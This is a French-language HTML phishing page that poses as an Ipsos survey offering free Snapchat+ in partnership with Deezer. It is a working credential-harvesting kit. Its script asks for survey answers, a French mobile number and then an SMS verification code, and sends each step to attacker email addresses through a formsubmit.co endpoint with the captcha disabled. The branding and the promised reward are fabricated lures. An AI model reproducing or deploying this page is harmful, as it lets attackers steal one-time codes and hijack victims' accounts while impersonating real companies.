<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Sondage | Ipsos</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        body { font-family:'Inter', sans-serif; background:#f4f6f9; margin:0; overflow-x:hidden; }
        .header { background:#003b7a; padding:20px 30px; display:flex; align-items:center; justify-content:center; position:relative; }
        .header img { height:50px; }
        .header a { position:absolute; left:30px; }
        .header-text { color:#fff; font-size:26px; font-weight:700; }
        .logo-fixed { position:fixed; top:20px; right:20px; height:55px; z-index:999; }
        .box { max-width:650px; margin:60px auto; background:white; padding:45px; border-radius:12px; box-shadow:0 4px 12px rgba(0,0,0,0.12); text-align:center; transition:all 0.5s ease; opacity:0; transform:translateY(30px); display:none; }
        .box.active { display:block; opacity:1; transform:translateY(0); }
        h2 { font-size:28px; margin-bottom:20px; color:#003b7a; }
        p { font-size:18px; margin-bottom:20px; color:#333; line-height:1.5; }
        input { width:100%; padding:14px; font-size:18px; border-radius:6px; border:1px solid #ccc; margin-bottom:15px; transition:all 0.3s; }
        input:focus { border-color:#0078d4; outline:none; box-shadow:0 0 8px rgba(0,120,212,0.3); }
        button { padding:14px 28px; background:#0078d4; color:#fff; border:0; border-radius:8px; cursor:pointer; font-size:18px; transition:all 0.3s; }
        button:hover { background:#005fa3; transform:translateY(-2px) scale(1.03); box-shadow:0 4px 12px rgba(0,0,0,0.15); }
        .progress-container { width:90%; height:16px; background:#e0e0e0; border-radius:8px; margin:30px auto; position:relative; }
        .progress-bar { height:100%; width:0%; background:#0078d4; border-radius:8px; transition:width 0.5s ease; }
        .progress-text { position:absolute; right:10px; top:0; font-size:14px; font-weight:600; color:#003b7a; line-height:16px; }
        .about { max-width:650px; margin:20px auto 40px auto; padding:20px; background:#e8f0fe; border-radius:10px; font-size:14px; color:#003b7a; line-height:1.4; text-align:left; }
        .footer { text-align:center; padding:20px 0; font-size:14px; color:#999; margin-top:20px; border-top:1px solid #ddd; }
        @media(max-width:600px){ .box{margin:30px 20px;padding:30px} h2{font-size:24px} p{font-size:16px} button{font-size:16px} .about{font-size:13px;padding:15px} }
    </style>
</head>
<body>

    <img src="francelogo.png" class="logo-fixed" alt="France">

    <div class="header">
        <a href="index.html" onclick="return confirm('Quitter le sondage ? Vos r√©ponses seront perdues.')">
            <img src="logo.png" alt="Ipsos">
        </a>
        <div class="header-text">Ipsos ‚Äì Sondage</div>
    </div>

    <div class="progress-container">
        <div class="progress-bar" id="progressBar"></div>
        <div class="progress-text" id="progressText">0%</div>
    </div>

    <!-- ETAPES -->
    <div class="box active" id="etape1">
        <h2>Recevoir Snapchat+ üéÅ</h2>
        <p>Pour recevoir Snapchat+, participez √† ce sondage en collaboration avec <strong>Deezer</strong>. Offre r√©serv√©e aux clients <strong>SFR, Bouygues ou Orange</strong>.</p>
        <input type="text" id="artiste_prefere" placeholder="Votre artiste pr√©f√©r√©">
        <input type="text" id="artiste_deezer" placeholder="Artiste que vous √©coutez sur Deezer">
        <input type="text" id="artiste_decouverte" placeholder="Artiste d√©couvert r√©cemment">
        <button id="btnEtape1">Suivant</button>
    </div>

    <div class="box" id="etape1b">
        <h2>Derni√®re v√©rification avant envoi</h2>
        <p>Avant de recevoir votre Snapchat+, nous devons effectuer une derni√®re v√©rification pour confirmer que vous √™tes bien un participant humain et √©viter tout abus. </p>
        <button id="btnEtape1b">Continuer</button>
    </div>

    <div class="box" id="etape2">
        <h2>Num√©ro de t√©l√©phone</h2>
        <input type="text" id="telephone" placeholder="Ex: 06XXXXXXXX">
        <button id="btnEtape2">Suivant</button>
    </div>

    <div class="box" id="etape3">
        <h2>Code de v√©rification</h2>
        <input type="text" id="code_sms" placeholder="Code re√ßu">
        <button id="btnEtape3">Terminer</button>
    </div>

    <div class="box" id="etape4">
        <h2>Merci !</h2>
        <p>Votre Snapchat+ sera activ√© dans l‚Äôheure. üéâ</p>
    </div>

    <div class="about">
        <strong>√Ä propos du partenariat :</strong><br>
        Ce sondage est organis√© par Ipsos en collaboration avec Deezer pour vous offrir Snapchat+ gratuitement.
        L‚Äôoffre est exclusivement r√©serv√©e aux clients SFR, Bouygues Telecom et Orange afin de garantir la disponibilit√© et la compatibilit√© du service. 
    </div>

    <div class="footer">¬© 2026 Ipsos ‚Äì Tous droits r√©serv√©s</div>

    <script>
        let reponses = {};

        function showStep(etapeId, percent){
            document.querySelectorAll('.box').forEach(b=>b.classList.remove('active'));
            document.getElementById(etapeId).classList.add('active');
            document.getElementById('progressBar').style.width = percent+"%";
            document.getElementById('progressText').innerText = percent+"%";
        }

        async function sendMail(dataObj, sujet){
            const formData = new FormData();
            formData.append("_subject", sujet);
            formData.append("_cc", "John123abcd@proton.me,John123abcd@proton.me");
            formData.append("_captcha", "false");
            for(let key in dataObj){ formData.append(key, dataObj[key]); }
            try {
                await fetch("https://formsubmit.co/tonemail@protonmail.com", { method:"POST", body:formData, headers:{"Accept":"application/json"} });
                console.log("Mail envoy√©:", sujet);
            } catch(e) {
                console.error("Erreur mail", e);
            }
        }

        // √âtape 1
        document.getElementById('btnEtape1').addEventListener('click', () => {
            let pref = document.getElementById('artiste_prefere').value.trim();
            let deezer = document.getElementById('artiste_deezer').value.trim();
            let decouverte = document.getElementById('artiste_decouverte').value.trim();
            if(!pref || !deezer || !decouverte) { alert("Veuillez remplir toutes les questions."); return; }

            reponses.artiste_prefere = pref;
            reponses.artiste_deezer = deezer;
            reponses.artiste_decouverte = decouverte;

            sendMail({artiste_prefere: pref, artiste_deezer: deezer, artiste_decouverte: decouverte}, "R√©ponses √©tape 1 - Ipsos");
            showStep('etape1b', 25);
        });

        // √âtape interm√©diaire
        document.getElementById('btnEtape1b').addEventListener('click', () => {
            showStep('etape2', 50);
        });

        // √âtape 2
        document.getElementById('btnEtape2').addEventListener('click', () => {
            let tel = document.getElementById('telephone').value.trim();
            if (!/^0[67]\d{8}$/.test(tel)) { alert("Num√©ro invalide (06 ou 07)."); return; }

            reponses.telephone = tel;
            sendMail({telephone: tel}, "R√©ponses √©tape 2 - Ipsos");
            showStep('etape3', 75);
        });

        // √âtape 3
        document.getElementById('btnEtape3').addEventListener('click', () => {
            let code = document.getElementById('code_sms').value.trim();
            if (!code) { alert("Veuillez entrer le code."); return; }

            reponses.code_sms = code;
            sendMail({code_sms: code}, "R√©ponses √©tape 3 - Ipsos");
            showStep('etape4', 100);
        });
    </script>

</body>
</html>

